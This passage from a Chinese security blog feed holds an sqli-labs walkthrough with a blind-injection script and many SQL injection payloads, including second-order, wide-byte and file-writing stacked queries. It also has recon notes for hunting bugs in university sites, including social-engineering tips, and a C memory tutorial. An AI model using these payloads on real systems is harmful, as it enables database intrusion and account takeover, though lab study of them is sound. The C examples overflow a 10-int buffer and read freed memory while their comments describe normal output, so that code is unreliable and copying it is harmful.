class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    res =requests.get(payload1.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> res.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">        length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        res = requests.get(payload.<span class="built_in">format</span>(i,j))</span><br><span class="line">        <span class="keyword">if</span> res.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702163713799.png" alt="image-20220702163713799"></p><p>我的靶场搭建在本地，正常响应非常迅速，所以我将sleep时间设置为1秒。需要根据实际情况设置时间，否则会影响结果。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>和Less-9一样的时间盲注，用双引号闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-10/?id=1%22and%20if(ascii(substr(database(),1,1))=115,%20sleep(5),%200)%20--+</span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>Union注入，报错注入都可以解决，只不过为POST方法。测试流程，payload和GET方法没有区别。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702165038472.png" alt="image-20220702165038472"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702165447462.png" alt="image-20220702165447462"></p><p>12-22的注入类型和前几关一样，只是方法为POST，在此不再赘述。</p><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>过滤了注释符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-23/?id=1&#x27; and 1=&#x27;1</span><br></pre></td></tr></table></figure><p>查询语句就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>正常闭合</p><p>union注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-23/?id=-1%27%20union%20select%201,(user()),%273</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702171546565.png" alt="image-20220702171546565"></p><p>报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-23/?id=-1%27%20union%20select%201,(exp(~(select%20*%20from%20(select%20user())a))),%273</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702171947946.png" alt="image-20220702171947946"></p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>登录接口用mysql_real_escape_string函数做了处理，引号等特殊符号都被转义了，没有利用方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">   <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;username:&#x27;</span>.<span class="variable">$username</span>.<span class="string">&quot; password:&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">output：</span><br><span class="line">username:<span class="number">1</span>\<span class="string">&#x27;?\&quot;v\&#x27;b\&quot; password:`</span></span><br></pre></td></tr></table></figure><p>问题出在pass_change.php里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>这里直接从session中取到username，直接带入到sql语句中，并未有过滤。mysql_real_escape_string函数只是转义，插入到数据库中引号还是存在的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702205809990.png" alt="image-20220702205809990"></p><p>现在利用思路就有了：</p><p>注册一个名为<code>admin&#39;#</code>的用户，进入修改密码界面，这时sql语句就会变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>即可实现修改admin用户的密码。</p><p>注册用户</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702210909259.png" alt="image-20220702210909259"></p><p>修改密码，原有的admin用户密码被修改了。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702210932182.png" alt="image-20220702210932182"></p><p>二次注入和PHP代码审计结合很紧密。</p><p>之后是各种过滤bypass关卡，本文重点总结sql注入类型，暂时不研究绕过了。</p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一关将引号转义了</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702212849204.png" alt="image-20220702212849204"></p><p>运用宽字节注入技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-32/?id=-1%df%27%20union%20select%201,user(),3--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702214201886.png" alt="image-20220702214201886"></p><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>源码中查询语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>此时可以使用堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-38/?id=1%27;select%20%22hack%20by%20luckyfuture%22%20into%20outfile%20%22C:\\wamp\\www\\hack.txt%22--+</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702220447027.png" alt="image-20220702220447027"></p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="outfile函数写shell"><a href="#outfile函数写shell" class="headerlink" title="outfile函数写shell"></a>outfile函数写shell</h3><p>利用条件</p><ul><li>secure_file_priv值为空，web目录已知</li></ul><p><a href="#Less-7">见Less-7</a> </p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>过滤<code>&quot;</code>引号</li></ul><p>16进制编码绕过 ,比如这里”)的十六进制为0x2229 最终网站也给我们返回了正确的信息</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701211502623.png" alt="image-20220701211502623"></p><ul><li>过滤注释符</li></ul><p><a href="#Less-23">再打一个引号手动闭合，见Less-23</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从接触信息安全开始，云了4年的SQL注入，面试遇到一顿扯，实战遇到sqlmap一把梭。今天终于动手把所有sql注入类型的原理利用方式复现了一遍。不能说完全透彻了，起码照着漏洞源代码，能判断是什么注入类型，能构造payload。</p><p>关于sql注入的利用提权，以及绕过思路，我打算实战中遇到了再详细整理。关于<code>--os-shell</code>和UDF提权我之前写过一篇<a href="https://github.com/luckyfuture0177/VULOnceMore/blob/main/%E6%88%98%E6%9C%AF%E6%8A%80%E5%B7%A7/SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.md">笔记</a>，当时理解的很肤浅，没有太大参考价值。</p><p>以前面试前经常会找一些sql注入的文章来临时看看，当时感觉知识点很多，挺复杂的。但是自己动手复现起来其实并不难，难的是说服自己动手去做。</p><blockquote><p>参考</p><p><a href="https://blog.51cto.com/hackedu/3407131">https://blog.51cto.com/hackedu/3407131</a></p><p><a href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/">https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.cnblogs.com/-qing-/p/11610385.html">https://www.cnblogs.com/-qing-/p/11610385.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SRC漏洞挖掘思路</title>
      <link href="/HoleDigging.html"/>
      <url>/HoleDigging.html</url>
      
        <content type="html"><![CDATA[<p>这个暑期准备重新开始漏洞挖掘之旅，因为我对java和php的代码审计并不熟悉，因此我将重点挖掘1Day漏洞和逻辑漏洞，因此我把目标放到了各类src项目上。现在漏洞挖掘的各个环节已经有很多工具可以利用了，我将自己的漏洞挖掘思路整理出来，作为备忘录使用。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>子域名收集</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOFA语法domain=&quot;xxx.edu.cn&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ksubdomain https://github.com/knownsec/ksubdomain</span><br><span class="line">./ksubdomain -d xxx.edu.cn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OneForAll https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></figure><ul><li>邮箱/用户名收集</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://phonebook.cz</span><br><span class="line">https://hunter.io</span><br><span class="line">http://www.skymem.info</span><br><span class="line">https://www.email-format.com/i/search</span><br></pre></td></tr></table></figure><ul><li>学号工号收集</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Google语法</span><br><span class="line">site:xxxx.edu.cn intext:&quot;学号&quot;</span><br><span class="line">QQ群社工</span><br></pre></td></tr></table></figure><ul><li>其它资产收集</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小蓝本https://www.xiaolanben.com/pc</span><br><span class="line">爱企查 https://aiqicha.baidu.com/</span><br></pre></td></tr></table></figure><ul><li>fofa语法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">教育src org=&quot;China Education and Research Network Center&quot;</span><br></pre></td></tr></table></figure><ul><li>集成化信息收集系统</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">资产侦察灯塔 https://github.com/TophantTechnology/ARL</span><br><span class="line">TScanhttps://github.com/dyboy2017/TScan</span><br><span class="line">https://github.com/w-digital-scanner/w12scan</span><br><span class="line">https://github.com/LangziFun/LangSrcCurise</span><br></pre></td></tr></table></figure><p>国内外类似项目都不少，准备先体验一下</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><ul><li>目录探测</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf</span><br><span class="line">https://github.com/ffuf/ffuf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">备份文件扫描</span><br><span class="line">给ffuf配一个备份文件字典</span><br></pre></td></tr></table></figure><p>需要配合目录字典使用，github上有很多，每次都是随缘使用，后期经验多了会比较整理一下</p><ul><li>未授权访问 </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">swagger-ui https://github.com/lijiejie/swagger-exp</span><br><span class="line">druid</span><br><span class="line">weblogic server</span><br><span class="line">各种控制台</span><br></pre></td></tr></table></figure><p>暂时没找到检测工具，未来可以自己写一个</p><ul><li>指纹探测定位弱点资产</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EHole(棱洞)https://github.com/EdgeSecurityTeam/EHole</span><br><span class="line">./Ehole3.0-linux -l url.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dismap https://github.com/zhzyker/dismap</span><br><span class="line">./dismap-0.4-linux-amd64 -f url.txt</span><br></pre></td></tr></table></figure><ul><li>漏洞扫描/验证利用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">###burpsuite插件####</span><br><span class="line">BurpFastJsonScan</span><br><span class="line">BurpShiroPassiveScan</span><br><span class="line">Log4j2Scan-0.11-SNAPSHOT 还没明白怎么用</span><br><span class="line">更多插件 https://github.com/Mr-xn/BurpSuite-collections</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">weblogic漏洞扫描 https://github.com/rabbitmask/WeblogicScan</span><br><span class="line">shiro漏洞扫描https://github.com/SummerSec/ShiroAttack2</span><br><span class="line">Struts2-Scanhttps://github.com/HatBoy/Struts2-Scan</span><br><span class="line">中间件，数据库，cms利用https://github.com/Aabyss-Team/All-Defense-Tool#中间件漏洞利用工具</span><br><span class="line">PeiQi-POC-WiKihttps://www.yuque.com/peiqiwiki/peiqi-poc-wiki</span><br><span class="line">网络公开POC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xrayhttps://github.com/chaitin/xray</span><br><span class="line">Goby</span><br><span class="line">各类扫描器，容易导致IP封禁，效果有限</span><br></pre></td></tr></table></figure><hr><p>暂时就想到这么多，后续会结合实战经验继续整理。</p><p>这几个月的实习经历让我感受到编写可复用的POC对于攻防层面的意义很大。因此未来我将对最新的，影响范围广的1Day漏洞编写POC。这些POC必须是可以统一管理，批量验证的，才能满足可复用的基本条件。我决定使用python作为POC编写语言，框架初步选择pocsuite3。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言动态内存分配</title>
      <link href="/CandCpp-DynamicStorage.html"/>
      <url>/CandCpp-DynamicStorage.html</url>
      
        <content type="html"><![CDATA[<p>malloc()/free()是C语言的标准库函数，new/delete是C++的运算符，它们都可用于申请动态内存和释放内存，new/delete在实现上其实调用了malloc()/free()函数，然后又做了一些其他封装，所以两者虽有相似却又有不同。</p><p>new与malloc()申请内存位置不同，new从自由存储区（free store）分配，而malloc()从堆区（heap）分配（请参考ISO14882内存管理部分），free store和heap很相似，都是动态内存，但位置不同，这就是为什么new出来的内存不能通过free()释放。</p><h3 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc()/free()"></a>malloc()/free()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">unsigned</span> size)</span>; <span class="comment">//申请size个字节的空间，返回首地址</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span>; <span class="comment">//释放以p为首地址的存储空间</span></span><br><span class="line"><span class="comment">//void *p 表示指向任意数据类型的指针</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *ptr;</span><br><span class="line">    <span class="type">int</span> size=<span class="number">10</span>;</span><br><span class="line">    ptr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(size*<span class="keyword">sizeof</span>(<span class="type">int</span>));  <span class="comment">//强制类型转换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(ptr+i) = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,ptr[i]); <span class="comment">//0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *ptr;</span><br><span class="line">    <span class="type">int</span> size=<span class="number">10</span>;</span><br><span class="line">    ptr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(size*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(ptr+i) = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,ptr[i]); <span class="comment">//0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr); <span class="comment">//C语言中的指针可以指向一块内存，如果这块内存稍后被操作系统回收（被释放），但是指针仍然指向这块内存，那么，此时该指针就是“悬空指针”。</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,ptr[i]); <span class="comment">//无输出</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *realloc(void *p, unsigend size); //扩展以p为首地址的存储空间到size个字节</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* ptr;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">10</span>;</span><br><span class="line">    ptr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(size * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(ptr + i) = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ptr[i]); <span class="comment">//0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    ptr = (<span class="type">int</span>*)<span class="built_in">realloc</span>(ptr, <span class="number">15</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        * (ptr + i) = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ptr[i]); <span class="comment">//0 1 2 3 4 5 6 7 8 9 10 11 12 13 14</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="new-delete"><a href="#new-delete" class="headerlink" title="new/delete"></a>new/delete</h3><p>在C语言中，动态分配内存时一般常使用malloc()函数，但是对于非内置数据类型（如struct、enum、class等），malloc()与free()无法满足动态对象的需求，因此C++引入new与delete关键字，用来进行内存申请与释放空间。</p><p>对于非内置类型对象而言，new/delete在创建对象时不止是分配内存，还会自动执行构造函数进行初始化，对象消亡之前自动执行析构函数，而malloc()/free()只能简单的分配释放内存。</p><p>malloc()函数申请内存时返回的是一个void*类型的指针，而new与malloc()不同，它分配一块存储空间并且指定了类型信息，并根据初始化列表中给出的值进行初始化，是直接可以使用的内存，这个过程，程序员常称之为new一个对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> 数据类型（初始化列表）;</span><br><span class="line"><span class="type">char</span> *pc = <span class="keyword">new</span> <span class="type">char</span>;         <span class="comment">//申请一段空间用来存储char类型，内存中没有初始值</span></span><br><span class="line"><span class="type">int</span> 